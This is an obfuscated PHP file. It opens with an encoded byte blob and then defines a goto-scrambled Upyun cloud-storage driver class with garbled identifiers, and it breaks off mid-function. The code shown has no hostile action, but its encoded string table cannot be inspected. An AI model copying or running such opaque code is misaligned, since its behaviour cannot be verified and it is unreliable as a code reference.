".'¬sr›')."\12\52\10\302\41\145\273\62\326\340\115\256\301\77\214\17\32\276\277\255\337\302\257\375\24\31\321\377\377\61\133\337\275\41\17\201\150\51\310\216\302\67\355\241\313"."\11\53\137\125\214\175\100\155\122\136\105\105\117\217\51\366\361\242\311\44\202\7\236\55\360\27\142\213\246\146\227\241\300\352\360\14\104\126\23\301\114\212\34\272\320"."\xcc\x90\x6f\x59\x1\x63\xfd\x2f\xa6\x82\xb2\x10\x98\xb\xe1\xa\x7\x45\x46\xee\x9e\x4d\xd1\x92\xed\x21\x15\xdb\xab\x58\xbf\xd2\x6f\x4c\x6f\x31\x76\xc9\x29\x9b\x4e\x1\x9c\x5\xb9"."\x9b\x62\x6\x11\x50\x10\x2a\x86\x73\x6f\xd6\xb1\xda\x9a\x7\xd5\x78\x1b\x4b\x1d\xd2\xee\xa\x9\xa0\xc8\x3d\x2d\x8\x84\x16\x2c\x4b\xed\x9b\x76\xc3\xea\x52\x4c\xc7\x1f\xbf\x40\x96"."\x2c\x5c\x74\x8c\x76\xb3\x65\x67\xb\xe\xd7\x44\xc3\x10\xd4\x90\xb8\x51\xa\x9b\x46\xd2\x13\xd2\x5f\xb2\xb5\xd1\x4b\xde\x48\xf\xc3\xd3\xc6\x6c\x7b\x64\x41\xfb\x3\x4e\x94\xf0\xc0"."\221\46\206\255\46\262\101\352\55\13\120\133\26\76\13\304\271\253\61\1\75\45\154\211\164\374\10\23\24\156\333\335\261\230\242\105\231\205\17\140\317\110\130\370\2"."\303\376\236\12\40\334\104\347\163\40\312\76\111\116\146\202\70\221\252\56\376\232\303\376\116\132\126\60\227\25\336\76\264\75\152\150\175\361\260\127\354\26\164\30\140"."\xdb\xe5\xd4\xa4\xf\x5a\x48\xe2\xeb\x10\x72\x76\x20\x67\x65\x38\x4c\x9\xf4\xff\xeb\x77\xd2\xfe\x5f\x3e\x8f\xc6\xb4\xc5\xdb\x8\x1\x6d\xeb\xa3\xf5\x4\xdd\x5f\xcc\x25\xe0\xe9\xb0".base64_decode('xEiEMwzwaHIJT32hONNLpM4jqE8Jmd1twFsiJjPAYlhSBL4jUyDVpK8vAUDt').base64_decode('Z88DFYsUPnBnATlKz/IBZNR4f5FbNDjxfqvbPoG8KCjGkRSgQqgjDTcNIU4M').base64_decode('UqcUN4rWZMEs5djKCTpeOptiFWR7SpCLiFAsSQVoKGI5Pi2J4vTwBwRd1ncK')."\x49\x8d\xe\xdb\xeb\x37\xb8\x90\xc5\xa7\xa3\x45\x4\x5d\x78\xa9\x5a\x58\x9b\x6d\x61\xb1\xa\xd4\xe0\xb4\x4a\x6a\xd8\x63\x79\x55\xf6\xd7\xf3\xaa\x9d\x85\x1f\xc3\xa\xd4\x50\x9e\x10"."\x82\x1c\xbf\xcb\xf6\x41\xb6\xb1\x8a\xee\x22\xf6\x2a\xa1\xc0\xd6\x82\x90\xd8\x75\xba\x1b\x3b\x75\xd\x91\x63\xd6\x54\x26\xa0\x10\x54\xd9\x4\x9c\x58\xf0\x68\x94\x4d\x70\xf\x38\x29"."\341\136\13\273\131\302\276\74\241\27\31\200\2\245\160\127\107\31\322\352\207\11\60\100\234\346\21\352\160\231\64\106\22\376\140\317\56\145\60\33\66\262\14\76\135".strrev('§î¶YÔkXv-ZçıÊ<‹S`|ÈÊKtÍQ…ƒÊ0è‰ÜK•å|Ê')."\131\305\212\305\65\335\20\212\261\364\142\145\341\223\137\246\145\241\270\27\125\273\367\124\304\220\143\36\333\302\152\223\373\111\61\111\270\276\3\64\145\302\252\53\211"."\62\121\62\165\343\104\337\305\345\127\116\326\373\77\346\275\262\0\237\345\124\277\220\215\152\121\47\40\340\27\32\46\371\270\375\65\312\306\202\162\317\240\154\322\133".strrev('©{‰Ê‡ÖüƒÊ\'.–Ùá×jĞ9@”Íø€¯zXÆÜ"«.­{4')."\321\122\224\275\241\316\122\101\12\177\324\21\22\112\202\255\43\327\221\125\206\354\17\213\271\104\373\110\113\301\302\124\156\13\151\37\27\332\13\54\235\134\276\145\4".strrev('è9Ê6©-;ØéP[¬›&­\'ùÌã#î	Ö¹¾µ·%ÊeÇ{	<-'."\r".'')."\x21\x6a\xcb\x32\xc4\xd7\x25\xad\xf7\x79\xa2\xa8\x40\x58\x5b\x25\xe5\x17\x9a\x13\xef\xfa\x76\x5b\x21\x5c\xfc\x23\x1c\xdc\xac\x53\x2c\x98\xb7\xf2\xc\x7a\x56\x69\x96\xc9\x17\x10\x24".base64_decode('GxgpGRIzLd2xLy1iBjhc4sQ0Eoa6qBy5sLxi671YwT4yXEMvmB9Sp/in7R+g')."\323\143\147\270\170\43\2\253\123\240\11\20\321\212\324\301\75\52\132\15\147\241\347\213\31\61\146\251\153\14\251\146\274\267\150\135\234\5\353\26\144\323\312\202\164".strrev('-^»²ºTQ{Åùq^Ç€G?…¢Ï›»¢âÚÆØŠ\'´Â<œ+Ã7c9Êg¨C').base64_decode('vNteFHmjlfisKoIPaU4RDMgv4wtxLc8rohqA24TnqOhIpUi2qGdQXBMhVHQX').base64_decode('G1YVAVu6ODFc34hoIPVnqJkFqM61qKDSJHvXk7VHCTSbhiqFvUxO0IYsquLq')."\100\57\73\27\260\232\51\231\12\315\5\355\140\314\140\150\246\32\27\264\222\354\157\125\343\174\372\221\24\27\262\175\264\145\315\316\255\67\357\334\174\335\316\13\316".base64_decode('2HHhHxyj5/5x9KqzuY9elDF69eqPL79ghjR69ikw89Iztz+4Bf+748YHPtq8')."\xd\xba\xf7\x45\x45\x76\xdc\xf1\xc0\x47\x77\xfc\x71\xe7\x25\xb7\x8c\x9e\x75\xdf\xe8\x65\xd7\x8e\xae\x3f\x8b\x7a\xb\xb2\x88\x7b\xa\x45\x43\x28\x89\x10\x60\x5c\x7e\x6d\xd1\xc1\xc6".base64_decode('JzqR4uPLtmZ4A8sucCBb5cAHJc6GL3E7YF5Ey6LfJs00Kd4BpK7thXtBoQGE').base64_decode('+G0NXBJ0gYCAFyEZFCTXfpAFDSs4F6EmSwReTLBIqPAGojVnu3DkCYB5jGnD').base64_decode('1HsZNATl/eFvi8p20oyrFRDgFdUzkLmt4cY5buIG1onacBIPI33ZHkt17Oye').base64_decode('qQn+WgtEMMmbwK4hkZQJOkr1LvSFI+GCrE5POLwgGGrBniQLslEtQROmIKuz')."\75\30\330\135\236\267\303\343\363\27\344\101\315\230\100\224\73\275\301\131\276\116\324\113\217\337\37\134\260\273\136\370\232\347\362\236\240\373\125\56\55\317\366\152\124"."\x20\x4c\x2f\x15\xc2\x72\x8a\xf2\xd0\x82\x49\x98\x92\xe6\x9e\x90\x78\x1d\xab\x68\x40\x5c\x57\x83\xba\x0\x63\x1\xab\xcf\x75\x9b\x92\x1a\x5\x58\xd2\x10\xd4\x6a\x9\x90\xb6\x43\x59"."\x92\xa\x3d\x6b\x32\x4c\xc1\xc8\x5f\x34\x20\xcd\xa6\xfb\x8e\x6f\x90\x5d\x96\x9b\x66\x21\x1d\x6d\x16\xe1\x25\x7a\xcc\x1f\x8\x67\x31\x4a\xa8\x28\x3a\x63\xe2\x8d\x70\xe1\x5\x0\xca"."\xe5\x33\x2\x7b\x3a\x47\x23\x7a\x54\x7d\x5a\x4c\x90\x14\x62\x6e\x84\xd8\x66\x91\x39\x16\x54\x99\x70\x98\x64\xff\x1f\xc8\x71\x8b\x18\x29\x9a\x0\x0".""."".base64_decode(''), 10, -8))); goto E¥«ó½’Œ„; d¸Ö™‚ƒ÷: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\57\x2f\166\60\x2e\x61\x70\151\56\165\160\171\x75\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($c¼„å«òİ·) { parent::__construct(); $this->_init($c¼„å«òİ·); } public function _init($aÉğÔîÊë) { $bš¤“Ö­© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($aÉğÔîÊë as $d„ÚìÃ·ìß => $AÑÈ‡£õîó) { if (isset($this->{$d„ÚìÃ·ìß})) { $this->{$d„ÚìÃ·ìß} = $AÑÈ‡£õîó; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($bš¤“Ö­©[1290] . LNG($bš¤“Ö­©[1222])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($E§¥ºñª¤—, $cä¼ÒÙù•À = "\107\x45\124") { $BòÃÍÇÎÃÉ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A…íøÏÖ”Ò = gmdate($BòÃÍÇÎÃÉ[1256]); $c”ŠÒï„İˆ = base64_encode(hash_hmac($BòÃÍÇÎÃÉ[1291], "{$cä¼ÒÙù•À}\46{$E§¥ºñª¤—}\x26{$A…íøÏÖ”Ò}", md5("{$this->userpass}"), !0)); $Eãªï§½Å = array("\101\x75\x74\150\x6f\162\x69\x7a\x61\164\151\157\x6e\x3a\125\x50\x59\125\116\x20{$this->username}\72{$c”ŠÒï„İˆ}", "\x44\x61\164\145\x3a{$A…íøÏÖ”Ò}"); return $Eãªï§½Å; } public function ussRequest($c·÷‰íç¥, $D‹½‘ŒÏô = "\x47\105\x54", $e¯˜°˜°æ = false, $aÅå®¤‡¢• = false, $cê±«İí–™ = false) { goto c­ì…§àò¯; bÆŸ¡Û¤ßä: if (!$EƒíÓ…ƒçÅ) { return array($aßºåâá»—[1050] => !1, $aßºåâá»—[1052] => $aßºåâá»—[1292]); } if (strtolower($D‹½‘ŒÏô) == $aßºåâá»—[188] || in_array($EƒíÓ…ƒçÅ[$aßºåâá»—[1050]], array($aßºåâá»—[1150], $aßºåâá»—[1293]))) { $e¯˜°˜°æ = $EƒíÓ…ƒçÅ[$aßºåâá»—[1294]]; } else { $e¯˜°˜°æ = json_decode($EƒíÓ…ƒçÅ[$aßºåâá»—[1052]], !0); if (!$e¯˜°˜°æ) { $e¯˜°˜°æ = $EƒíÓ…ƒçÅ[$aßºåâá»—[1052]]; } else { if (!$EƒíÓ…ƒçÅ[$aßºåâá»—[697]] && isset($e¯˜°˜°æ[$aßºåâá»—[1295]])) { $e¯˜°˜°æ = $e¯˜°˜°æ[$aßºåâá»—[1295]]; } } } return array($aßºåâá»—[1050] => $EƒíÓ…ƒçÅ[$aßºåâá»—[697]], $aßºåâá»—[1052] => $e¯˜°˜°æ); goto Bë•õ†÷‘Æ; c­ì…§àò¯: $aßºåâá»— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c·÷‰íç¥ = trim($c·÷‰íç¥, $aßºåâá»—[8]); $bå¬ŠÇ’¢Ú = "\57{$this->bucket}\57{$c·÷‰íç¥}"; goto dİ‹¡‚ÉÄÍ; dİ‹¡‚ÉÄÍ: $f¤«ª…öÊ‡ = $this->ussHeaders($bå¬ŠÇ’¢Ú, $D‹½‘ŒÏô); if ($aÅå®¤‡¢•) { $f¤«ª…öÊ‡ = array_merge($f¤«ª…öÊ‡, $aÅå®¤‡¢•); } $EƒíÓ…ƒçÅ = url_request($this->endpoint . $bå¬ŠÇ’¢Ú, $D‹½‘ŒÏô, $e¯˜°˜°æ, $f¤«ª…öÊ‡, $cê±«İí–™); goto bÆŸ¡Û¤ßä; Bë•õ†÷‘Æ: } public function mkfile($AÊ‚õÅ³¨, $F×åã»èš¥ = '', $e÷ÛÂÑé = REPEAT_RENAME) { if ($this->setContent($AÊ‚õÅ³¨, $F×åã»èš¥)) { return $this->getPathOuter($AÊ‚õÅ³¨); } return !1; } public function mkdir($D„Ù×˜ßÎª, $AÏˆ™ÜêÉ˜ = REPEAT_SKIP) { $aœ¦†ĞˆÂº =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¼œª³†Ôæ = trim($D„Ù×˜ßÎª, $aœ¦†ĞˆÂº[8]); if ($this->_isFolder($B¼œª³†Ôæ)) { return $this->getPathOuter($B¼œª³†Ôæ); } $dÚ±ùÔ•Äò = array($aœ¦†ĞˆÂº[1296]); $c‡î¾œ“» = $this->ussRequest($B¼œª³†Ôæ, $aœ¦†ĞˆÂº[220], !1, $dÚ±ùÔ•Äò); return $c‡î¾œ“»[$aœ¦†ĞˆÂº[1050]] ? $this->getPathOuter($B¼œª³†Ôæ) : !1; } public function copyFile($fì¼ôÇÌâã, $aãáà÷Å£Î) { $Bí ¥ƒ±³ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eŸİÂ‡¢á = array($Bí ¥ƒ±³[1297] . "\57{$this->bucket}\57{$fì¼ôÇÌâã}", $Bí ¥ƒ±³[1298]); $FáÕ¯î×Ö = $this->ussRequest($aãáà÷Å£Î, $Bí ¥ƒ±³[222], !1, $eŸİÂ‡¢á); return $FáÕ¯î×Ö[$Bí ¥ƒ±³[1050]] ? !0 : $this->getPathOuter($aãáà÷Å£Î); } public function moveFile($DÊÅ½‚“ô, $BŸ¿ê‘ºê‘) { $cŒêŒéÂõ™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D¤÷ïÅê × = array($cŒêŒéÂõ™[1299] . "\x2f{$this->bucket}\57{$DÊÅ½‚“ô}", $cŒêŒéÂõ™[1298]); $DŠ¥°½·å = $this->ussRequest($BŸ¿ê‘ºê‘, $cŒêŒéÂõ™[222], !1, $D¤÷ïÅê ×); return $DŠ¥°½·å[$cŒêŒéÂõ™[1050]] ? !0 : $this->getPathOuter($BŸ¿ê‘ºê‘); } public function delFile($C¯è–ÎÉƒŸ) { $DÇ¦Ô‡®Ô‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D˜©åé†›¹ = $this->ussRequest($C¯è–ÎÉƒŸ, $DÇ¦Ô‡®Ô‚[1300]); return $D˜©åé†›¹[$DÇ¦Ô‡®Ô‚[1050]] ? !0 : !1; } public function delFolder($E•îƒ‰ÕòÊ) { goto bëã„¸î®Ö; bëã„¸î®Ö: $AÙ½ÕÈ¸ÍÆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->exist($E•îƒ‰ÕòÊ)) { return !0; } $this->listItemCache = !1; goto dí —ªÉì; dí —ªÉì: $e¤÷Ÿëˆ†Û = $A‘’Û±´À = array(); $this->fileList($E•îƒ‰ÕòÊ, $e¤÷Ÿëˆ†Û, $A‘’Û±´À, !0); $this->listItemCache = !0; goto EÎËõ·ò”»; e¤íÖºÛ: return $CÑ…ØÕëäÏ[$AÙ½ÕÈ¸ÍÆ[1050]]; goto Dƒ‰–ô¥ßÁ; EÎËõ·ò”»: foreach ($A‘’Û±´À as $Fğá“Á„Ê·) { $CÑ…ØÕëäÏ = $this->ussRequest($Fğá“Á„Ê·[$AÙ½ÕÈ¸ÍÆ[28]], $AÙ½ÕÈ¸ÍÆ[1300]); if (!$CÑ…ØÕëäÏ[$AÙ½ÕÈ¸ÍÆ[1050]]) { return !1; } } foreach ($e¤÷Ÿëˆ†Û as $eİË†Á®‹¨) { $CÑ…ØÕëäÏ = $this->ussRequest($eİË†Á®‹¨, $AÙ½ÕÈ¸ÍÆ[1300]); if (!$CÑ…ØÕëäÏ[$AÙ½ÕÈ¸ÍÆ[1050]]) { return !1; } } $CÑ…ØÕëäÏ = $this->ussRequest($E•îƒ‰ÕòÊ, $AÙ½ÕÈ¸ÍÆ[1300]); goto e¤íÖºÛ; Dƒ‰–ô¥ßÁ: } public function rename($FºÌ‡‰Òæ, $cƒ©Ì‹¤Û‘) { if ($this->isFile($FºÌ‡‰Òæ)) { $cƒ©Ì‹¤Û‘ = get_path_father($FºÌ‡‰Òæ) . $cƒ©Ì‹¤Û‘; return $this->moveFile($FºÌ‡‰Òæ, $cƒ©Ì‹¤Û‘); } return $this->renameObject($FºÌ‡‰Òæ, $cƒ©Ì‹¤Û‘); } public function fileInfo($b‚¬’ñÅÎ¡, $F¦É—ÉêĞĞ = false, $F­ˆ‰Í«ĞÈ = array()) { goto f‹¥‡»å†; BŒ£õ·Ğ°˜: $F¢†‚´¥‡[$F­¾õ‘æ™•[190]] = $F¢†‚´¥‡[$F­¾õ‘æ™•[107]] = 0; $F¢†‚´¥‡[$F­¾õ‘æ™•[191]] = $F¢†‚´¥‡[$F­¾õ‘æ™•[192]] = !0; if (empty($F­ˆ‰Í«ĞÈ)) { $F­ˆ‰Í«ĞÈ = $this->objectMeta($b‚¬’ñÅÎ¡); if (!$F­ˆ‰Í«ĞÈ) { return $F¢†‚´¥‡; } } goto CÏÙóºÒîÁ; f‹¥‡»å†: $F­¾õ‘æ™• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F¢†‚´¥‡ = array($F­¾õ‘æ™•[28] => $this->pathThis($b‚¬’ñÅÎ¡), $F­¾õ‘æ™•[75] => $this->getPathOuter($F­¾õ‘æ™•[8] . $b‚¬’ñÅÎ¡), $F­¾õ‘æ™•[29] => $F­¾õ‘æ™•[171], $F­¾õ‘æ™•[77] => isset($F­ˆ‰Í«ĞÈ[$F­¾õ‘æ™•[77]]) ? $F­ˆ‰Í«ĞÈ[$F­¾õ‘æ™•[77]] : 0, $F­¾õ‘æ™•[165] => $this->ext($b‚¬’ñÅÎ¡)); if ($F¦É—ÉêĞĞ) { return $F¢†‚´¥‡; } goto BŒ£õ·Ğ°˜; CÏÙóºÒîÁ: $F¢†‚´¥‡[$F­¾õ‘æ™•[190]] = intval($F­ˆ‰Í«ĞÈ[$F­¾õ‘æ™•[1301]]); $F¢†‚´¥‡[$F­¾õ‘æ™•[107]] = intval($F­ˆ‰Í«ĞÈ[$F­¾õ‘æ™•[1302]]); $F¢†‚´¥‡[$F­¾õ‘æ™•[77]] = $F­ˆ‰Í«ĞÈ[$F­¾õ‘æ™•[77]]; goto DÔ‰ŠŞˆéÅ; DÔ‰ŠŞˆéÅ: return $F¢†‚´¥‡; goto a‰½¿»İ’£; a‰½¿»İ’£: } public function folderInfo($F„¾ØÜ×¦Ã, $eŞùï¾³†á = false) { goto fàˆ—ê×ä; fàˆ—ê×ä: $b¯‘‡Ø¢Ïµ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F™±ÂÖœï = array($b¯‘‡Ø¢Ïµ[28] => $this->pathThis($F„¾ØÜ×¦Ã), $b¯‘‡Ø¢Ïµ[75] => $this->getPathOuter($b¯‘‡Ø¢Ïµ[8] . $F„¾ØÜ×¦Ã), $b¯‘‡Ø¢Ïµ[29] => $b¯‘‡Ø¢Ïµ[76]); if ($eŞùï¾³†á) { return $F™±ÂÖœï; } goto CÉ¬Óê¬Ü; F’èÌƒ´¶ : $F™±ÂÖœï[$b¯‘‡Ø¢Ïµ[190]] = intval($f…Èå¦Â¤Æ[$b¯‘‡Ø¢Ïµ[1301]]); $F™±ÂÖœï[$b¯‘‡Ø¢Ïµ[107]] = intval($f…Èå¦Â¤Æ[$b¯‘‡Ø¢Ïµ[1302]]); return $F™±ÂÖœï; goto eÒÛÉÍÁÈÊ; CÉ¬Óê¬Ü: $F™±ÂÖœï[$b¯‘‡Ø¢Ïµ[190]] = $F™±ÂÖœï[$b¯‘‡Ø¢Ïµ[107]] = 0; $F™±ÂÖœï[$b¯‘‡Ø¢Ïµ[191]] = $F™±ÂÖœï[$b¯‘‡Ø¢Ïµ[192]] = !0; if (empty($f…Èå¦Â¤Æ)) { $f…Èå¦Â¤Æ = $this->objectMeta($F„¾ØÜ×¦Ã); if (!$f…Èå¦Â¤Æ) { return $F™±ÂÖœï; } } goto F’èÌƒ´¶ ; eÒÛÉÍÁÈÊ: } private function listObjs($dËŞÅˆÍˆœ, $B¾¼ŞŠº = 0, $BËôåœØĞ² = 1000) { $A©£³íÖ¼Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÖ—ÓßÜÍ = array($A©£³íÖ¼Œ[1303], $A©£³íÖ¼Œ[1304] . $BËôåœØĞ²); if ($B¾¼ŞŠº) { $EÖ—ÓßÜÍ[] = $A©£³íÖ¼Œ[1305] . $B¾¼ŞŠº; } $B¤ÓÂ¶Ø¹ = $this->ussRequest($dËŞÅˆÍˆœ, $A©£³íÖ¼Œ[224], !1, $EÖ—ÓßÜÍ); return !$B¤ÓÂ¶Ø¹[$A©£³íÖ¼Œ[1050]] ? !1 : $B¤ÓÂ¶Ø¹[$A©£³íÖ¼Œ[1052]]; } private function fileList($aÃ¯ƒÀ÷„ç, &$a´ºÌÀÊÅ‹, &$aâ¡˜‡¿¤, $CÎ’Íé–Ç¸ = false) { goto e«à‡©Ù–; E­òí”™: if ($a¢ŒëØÌŠÁ) { $this->cacheMethod($f¤â‡éê[195], $aÃ¯ƒÀ÷„ç, !0); } goto d÷ëÙŸšªñ; e«à‡©Ù–: $f¤â‡éê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bóëÓ‡Ÿ = $f¤â‡éê[33]; $E˜Ş¢‚çÔ = 1000; goto dé¬‘ô°í¹; dé¬‘ô°í¹: $Aè‡”Êáµî = rtrim($aÃ¯ƒÀ÷„ç, $f¤â‡éê[8]) . $f¤â‡éê[8]; $a¢ŒëØÌŠÁ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $CÌ¡ØãÏê = $this->listObjs($aÃ¯ƒÀ÷„ç, $bóëÓ‡Ÿ, $E˜Ş¢‚çÔ); if (!$CÌ¡ØãÏê) { return !1; } $bóëÓ‡Ÿ = isset($CÌ¡ØãÏê[$f¤â‡éê[1306]]) ? $CÌ¡ØãÏê[$f¤â‡éê[1306]] : $f¤â‡éê[33]; $D´Ğ„ïã¬» = isset($CÌ¡ØãÏê[$f¤â‡éê[1307]]) ? $CÌ¡ØãÏê[$f¤â‡éê[1307]] : array(); foreach ($D´Ğ„ïã¬» as $cÙÓò«ç˜í) { $e£ĞÛéï£° = $cÙÓò«ç˜í[$f¤â‡éê[29]] == $f¤â‡éê[76] ? !0 : !1; $dãŞÒŸó…Ñ = ltrim($Aè‡”Êáµî . $cÙÓò«ç˜í[$f¤â‡éê[28]], $f¤â‡éê[8]) . ($e£ĞÛéï£° ? $f¤â‡éê[8] : $f¤â‡éê[33]); $aÈ´µ¸Œµ = array($f¤â‡éê[28] => $dãŞÒŸó…Ñ, $f¤â‡éê[29] => $e£ĞÛéï£° ? $f¤â‡éê[76] : $f¤â‡éê[171], $f¤â‡éê[77] => $cÙÓò«ç˜í[$f¤â‡éê[331]], $f¤â‡éê[1302] => $cÙÓò«ç˜í[$f¤â‡éê[1308]]); if ($a¢ŒëØÌŠÁ) { $this->cacheMethod($f¤â‡éê[195], $dãŞÒŸó…Ñ, $e£ĞÛéï£°); $this->cacheMethod($f¤â‡éê[196], $dãŞÒŸó…Ñ, $aÈ´µ¸Œµ); } if ($e£ĞÛéï£°) { $a´ºÌÀÊÅ‹[] = $dãŞÒŸó…Ñ; if ($CÎ’Íé–Ç¸) { $this->fileList($dãŞÒŸó…Ñ, $a´ºÌÀÊÅ‹, $aâ¡˜‡¿¤, $CÎ’Íé–Ç¸); } continue; } $aâ¡˜‡¿¤[] = $aÈ´µ¸Œµ; } if (count($D´Ğ„ïã¬») < $E˜Ş¢‚çÔ) { break; } } goto E­òí”™; d÷ëÙŸšªñ: } public function listPath($d³­Ï»®Í, $E¤Ê•˜®†á = false) { $fŠñéøÃ•— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dòØÅÊŒ = $f³Çé…¬ä¼ = array(); $this->fileList($d³­Ï»®Í, $dòØÅÊŒ, $f³Çé…¬ä¼); foreach ($dòØÅÊŒ as $dñíÍ„ƒô => $AÂÃ˜ìÈ±œ) { $dòØÅÊŒ[$dñíÍ„ƒô] = $this->folderInfo($AÂÃ˜ìÈ±œ, $E¤Ê•˜®†á); } foreach ($f³Çé…¬ä¼ as $dñíÍ„ƒô => $AÂÃ˜ìÈ±œ) { $f³Çé…¬ä¼[$dñíÍ„ƒô] = $this->fileInfo($AÂÃ˜ìÈ±œ[$fŠñéøÃ•—[28]], $E¤Ê•˜®†á, $AÂÃ˜ìÈ±œ); } return array($fŠñéøÃ•—[74] => $dòØÅÊŒ, $fŠñéøÃ•—[73] => $f³Çé…¬ä¼); } public function has($Dàåé¼ô¦Š, $B‡ ÅŒá¿ = false, $E¡¤ˆçÕ• = true) { goto DÏÚ¼ë°ù²; DÏÚ¼ë°ù²: $bšâÁ†Ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F˜Âî×¬°Ø = $bšâÁ†Ø[33]; $F‘ˆ®Ú»Ú = 500; goto dšóÇ„ŞĞå; dšóÇ„ŞĞå: $f®§»ÕÙ‰Ä = 0; $fÖÚÑÓÓÌŒ = 0; $c½ÖØ’Ş¥ = rtrim($Dàåé¼ô¦Š, $bšâÁ†Ø[8]) . $bšâÁ†Ø[8]; goto CÚ±ö‚‡Ğ; CÚ±ö‚‡Ğ: while (!0) { check_abort(); $e‘ÓØ¸·“– = $this->listObjs($Dàåé¼ô¦Š, $F˜Âî×¬°Ø, $F‘ˆ®Ú»Ú); if (!$e‘ÓØ¸·“–) { return !1; } $F˜Âî×¬°Ø = isset($e‘ÓØ¸·“–[$bšâÁ†Ø[1306]]) ? $e‘ÓØ¸·“–[$bšâÁ†Ø[1306]] : $bšâÁ†Ø[33]; $cé­Ÿµ’å = isset($e‘ÓØ¸·“–[$bšâÁ†Ø[1307]]) ? $e‘ÓØ¸·“–[$bšâÁ†Ø[1307]] : array(); if (empty($cé­Ÿµ’å)) { break; } $EİßÎ¨ñéî = array_filter($cé­Ÿµ’å, function ($e—¨²ñ¢») { $F…í°òƒ¯¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return $e—¨²ñ¢»[$F…í°òƒ¯¦[29]] == $F…í°òƒ¯¦[76]; }); $Aœï¦•ÚÓ = count($cé­Ÿµ’å); $EİßÎ¨ñéî = count($EİßÎ¨ñéî); $b¥—ÂóÔĞº = $Aœï¦•ÚÓ - $EİßÎ¨ñéî; if ($B‡ ÅŒá¿) { $fÖÚÑÓÓÌŒ += $EİßÎ¨ñéî; $f®§»ÕÙ‰Ä += $b¥—ÂóÔĞº; if ($Aœï¦•ÚÓ < $F‘ˆ®Ú»Ú) { break; } continue; } if ($E¡¤ˆçÕ•) { if ($b¥—ÂóÔĞº) { return !0; } } else { if ($EİßÎ¨ñéî) { return !0; } } if ($Aœï¦•ÚÓ < $F‘ˆ®Ú»Ú) { break; } } if ($B‡ ÅŒá¿) { return array($bšâÁ†Ø[199] => $f®§»ÕÙ‰Ä, $bšâÁ†Ø[200] => $fÖÚÑÓÓÌŒ); } return !1; goto d¦±é¼²¹ğ; d¦±é¼²¹ğ: } public function listAll($AåœÆ¸ØÒª) { goto BÁø©ø‡¯¶; BÁø©ø‡¯¶: $cŠˆ—‰àà© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BŒ–œø§œ = $AİÇƒ½½«„ = array(); $this->fileList($AåœÆ¸ØÒª, $BŒ–œø§œ, $AİÇƒ½½«„, !0); goto EÛÂŒëÛšŒ; EÛÂŒëÛšŒ: $A¥Õñ¥ÔÊ = array(); foreach ($AİÇƒ½½«„ as $bßÈÕ‘ä˜À) { $A¥Õñ¥ÔÊ[$bßÈÕ‘ä˜À[$cŠˆ—‰àà©[28]]] = $bßÈÕ‘ä˜À[$cŠˆ—‰àà©[77]]; } foreach ($BŒ–œø§œ as $bßÈÕ‘ä˜À) { if (is_string($bßÈÕ‘ä˜À)) { $A¥Õñ¥ÔÊ[$bßÈÕ‘ä˜À] = 0; } } goto B´Œ¸ÊƒÂ; B´Œ¸ÊƒÂ: return $this->listAllFiles($AåœÆ¸ØÒª, array_keys($A¥Õñ¥ÔÊ), $A¥Õñ¥ÔÊ); goto C–°Œ’¼³µ; C–°Œ’¼³µ: } public function canRead($E¶„ç°àÈô) { return $this->exist($E¶„ç°àÈô) ? !0 : !1; } public function canWrite($Fè•ĞÇÆ©¤) { return $this->exist($Fè•ĞÇÆ©¤) ? !0 : !1; } public function getContent($FÉÜ£–äç‡) { return $this->fileSubstr($FÉÜ£–äç‡, 0, -1); } public function setContent($dˆ¨­—¸‡ñ, $BÉ‹ØÅ¦Ò = '') { $D¤ºŸÑ™åĞ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$BÉ‹ØÅ¦Ò) { $e¸‡ˆ…ÈÔÖ = $this->ussRequest($dˆ¨­—¸‡ñ, $D¤ºŸÑ™åĞ[220]); return $e¸‡ˆ…ÈÔÖ[$D¤ºŸÑ™åĞ[1050]]; } $Eö¤¶ÏˆÖ¾ = $this->tempFile($this->pathThis($dˆ¨­—¸‡ñ)); file_put_contents($Eö¤¶ÏˆÖ¾, $BÉ‹ØÅ¦Ò); if ($this->upload($dˆ¨­—¸‡ñ, $Eö¤¶ÏˆÖ¾)) { $this->tempFileRemve($Eö¤¶ÏˆÖ¾); return !0; } return !1; } public function fileSubstr($D§á¾†¯ñÓ, $aãÍŞèéŸ, $eó¼„‚‘È) { $c’Œµ†Ü““ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!($bÈœ®óõŒ = $this->link($D§á¾†¯ñÓ))) { return !1; } $e¶ÀÎŠÒá… = !1; if ($eó¼„‚‘È > 0) { $bé›¹«°Ï’ = $aãÍŞèéŸ + $eó¼„‚‘È - 1; $e¶ÀÎŠÒá… = array($c’Œµ†Ü““[1269] . $aãÍŞèéŸ . $c’Œµ†Ü““[428] . $bé›¹«°Ï’); } $f®†³š„ÈŸ = url_request($bÈœ®óõŒ, $c’Œµ†Ü““[224], !1, $e¶ÀÎŠÒá…); return $f®†³š„ÈŸ[$c’Œµ†Ü““[697]] ? $f®†³š„ÈŸ[$c’Œµ†Ü““[1052]] : !1; } public function upload($A˜èŸ”ÆÉ¥, $dƒ®ó´±Ëˆ, $b«æ±ßƒì† = false, $E“Ä×óœçÓ = REPEAT_REPLACE) { goto 